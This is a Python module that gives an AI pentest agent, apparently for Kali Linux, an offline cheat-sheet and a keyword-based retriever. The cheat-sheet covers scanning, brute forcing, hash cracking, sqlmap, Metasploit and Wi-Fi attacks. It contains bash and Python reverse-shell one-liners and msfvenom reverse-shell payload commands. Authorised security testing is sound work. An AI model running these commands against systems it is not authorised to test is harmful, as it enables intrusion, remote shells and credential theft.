"""
Local offline knowledge base (RAG) for Kali-AI Agent.

Small/weak models hallucinate tool flags and command syntax. To ground them, we keep a
compact built-in cheat-sheet of common Kali tools & techniques and retrieve the most
relevant snippets (by keyword/tool match) into each turn's prompt. No vector DB / no extra
dependency — pure keyword scoring, works fully offline.

Users can drop their own `.md`/`.txt` cheatsheets into ~/.config/kali-ai/knowledge/ and
they get indexed automatically.
"""

import os

_KB_DIR = os.path.join(os.path.expanduser("~"), ".config", "kali-ai", "knowledge")

# Each entry: (keywords, concise reference). Keep snippets short and accurate.
_ENTRIES = [
    (["nmap", "port", "scan", "service", "version", "ports", "recon"],
     "nmap: `nmap -sV -sC -T4 -p- <ip>` full TCP+service+scripts. SYN scan `-sS` (needs sudo). "
     "Top ports fast: `nmap -F <ip>`. UDP: `-sU`. OS: `-O`. Output: `-oN out.txt` / `-oA base`."),
    (["gobuster", "dir", "directory", "brute", "web", "fuzz", "content"],
     "gobuster dir: `gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html`. "
     "DNS: `gobuster dns -d <domain> -w <wordlist>`. vhost: `gobuster vhost -u <url> -w <wordlist>`."),
    (["ffuf", "fuzz", "web", "directory", "parameter"],
     "ffuf: `ffuf -u http://<ip>/FUZZ -w <wordlist> -mc 200,301,302 -t 60`. "
     "Param fuzz: `ffuf -u 'http://<ip>/page?FUZZ=1' -w params.txt`. Filter size: `-fs <n>`."),
    (["hydra", "brute", "password", "login", "ssh", "ftp", "bruteforce"],
     "hydra: `hydra -l <user> -P rockyou.txt ssh://<ip>`. HTTP POST form: "
     "`hydra -L users.txt -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"`."),
    (["john", "hash", "crack", "password", "cracking"],
     "john: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`. Show: `john --show hashes.txt`. "
     "Format: `--format=<name>`. Identify with `hashid`/`hash-identifier`."),
    (["hashcat", "hash", "crack", "gpu", "password"],
     "hashcat: `hashcat -m <mode> -a 0 hashes.txt rockyou.txt`. Common modes: 0=MD5, 100=SHA1, "
     "1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 22000=WPA. Show: `--show`."),
    (["sqlmap", "sql", "injection", "database", "web"],
     "sqlmap: `sqlmap -u 'http://<ip>/p?id=1' --batch --dbs`. Dump: `-D <db> -T <tbl> --dump`. "
     "From request file: `-r req.txt`. Risk/level: `--risk=3 --level=5`. Shell: `--os-shell`."),
    (["metasploit", "msfconsole", "exploit", "msfvenom", "payload", "meterpreter"],
     "msfconsole: `search <cve>`, `use <module>`, `set RHOSTS <ip>`, `set LHOST <ip>`, `run`. "
     "msfvenom reverse shell: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o sh.elf`. "
     "Windows: `-p windows/x64/meterpreter/reverse_tcp ... -f exe -o s.exe`."),
    (["smb", "smbclient", "enum4linux", "netbios", "445", "samba", "smbmap"],
     "SMB enum: `enum4linux -a <ip>`; `smbclient -L //<ip>/ -N`; `smbmap -H <ip>`; "
     "mount share: `smbclient //<ip>/<share> -N`. crackmapexec: `crackmapexec smb <ip> -u u -p p --shares`."),
    (["nikto", "web", "vuln", "scanner", "http"],
     "nikto: `nikto -h http://<ip>`. Add port: `-p 8080`. SSL: `-ssl`. Output: `-o out.txt`."),
    (["wpscan", "wordpress", "web", "cms"],
     "wpscan: `wpscan --url http://<ip> --enumerate u,vp,vt`. With API token: `--api-token <t>`. "
     "Brute user: `wpscan --url <url> -U admin -P rockyou.txt`."),
    (["reverse shell", "revshell", "nc", "netcat", "listener", "bind"],
     "Listener: `nc -lvnp 4444`. Bash revshell: `bash -i >& /dev/tcp/<ip>/4444 0>&1`. "
     "Python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<ip>\",4444));"
     "[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'`. Upgrade TTY: `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`."),
    (["privesc", "privilege", "escalation", "linpeas", "sudo", "suid", "root"],
     "Linux privesc checks: `sudo -l`; SUID: `find / -perm -4000 -type f 2>/dev/null`; "
     "run linpeas: `./linpeas.sh`. Check `cat /etc/crontab`, writable paths, kernel version (`uname -a`) for exploits."),
    (["enum", "enumeration", "whatweb", "web", "banner", "headers"],
     "Web recon: `whatweb http://<ip>`; headers `curl -I http://<ip>`; robots `curl http://<ip>/robots.txt`; "
     "source view for comments/endpoints. Check common ports 80/443/8080/8000."),
    (["dns", "dnsenum", "dnsrecon", "subdomain", "domain", "amass", "subfinder"],
     "DNS/subdomains: `dnsrecon -d <domain>`; `dnsenum <domain>`; `subfinder -d <domain>`; "
     "`amass enum -d <domain>`. Zone transfer: `dig axfr @<ns> <domain>`."),
    (["wifi", "wireless", "aircrack", "airodump", "handshake", "airmon", "wpa"],
     "Wi-Fi (use secondary adapter, keep primary online): `sudo airmon-ng start wlan1`; "
     "`sudo airodump-ng wlan1mon`; capture handshake `airodump-ng -c <ch> --bssid <bssid> -w cap wlan1mon`; "
     "crack `aircrack-ng cap-01.cap -w rockyou.txt`."),
    (["ghidra", "reverse engineering", "binary", "decompile", "disassemble", "malware"],
     "Ghidra RE: use the agent's `ghidra` tool — connect, analyze <file>, functions, decompile <func>. "
     "Also quick triage: `file <bin>`, `strings <bin>`, `checksec --file=<bin>`, `ltrace`/`strace`."),
]


def _load_user_entries():
    out = []
    try:
        if os.path.isdir(_KB_DIR):
            for fn in os.listdir(_KB_DIR):
                if fn.lower().endswith((".md", ".txt")):
                    path = os.path.join(_KB_DIR, fn)
                    try:
                        with open(path, "r", encoding="utf-8", errors="replace") as f:
                            text = f.read(4000)
                        kws = fn.lower().replace(".md", "").replace(".txt", "").replace("_", " ").replace("-", " ").split()
                        out.append((kws, f"[{fn}] " + text.strip()))
                    except Exception:
                        pass
    except Exception:
        pass
    return out


def retrieve(query: str, max_chars: int = 1400) -> str:
    """Return a compact block of the most relevant cheat-sheet snippets for the query."""
    q = (query or "").lower()
    if not q.strip():
        return ""
    entries = _ENTRIES + _load_user_entries()
    scored = []
    for kws, text in entries:
        score = sum(1 for k in kws if k in q)
        if score:
            scored.append((score, text))
    if not scored:
        return ""
    scored.sort(key=lambda x: x[0], reverse=True)
    picked, total = [], 0
    for _score, text in scored:
        if total + len(text) > max_chars:
            continue
        picked.append(text)
        total += len(text)
        if total >= max_chars:
            break
    if not picked:
        return ""
    return ("[Relevant tool reference — accurate syntax to ground your commands; adapt to the "
            "target and verify flags]:\n- " + "\n- ".join(picked))


def ensure_kb_dir() -> str:
    try:
        os.makedirs(_KB_DIR, exist_ok=True)
    except Exception:
        pass
    return _KB_DIR
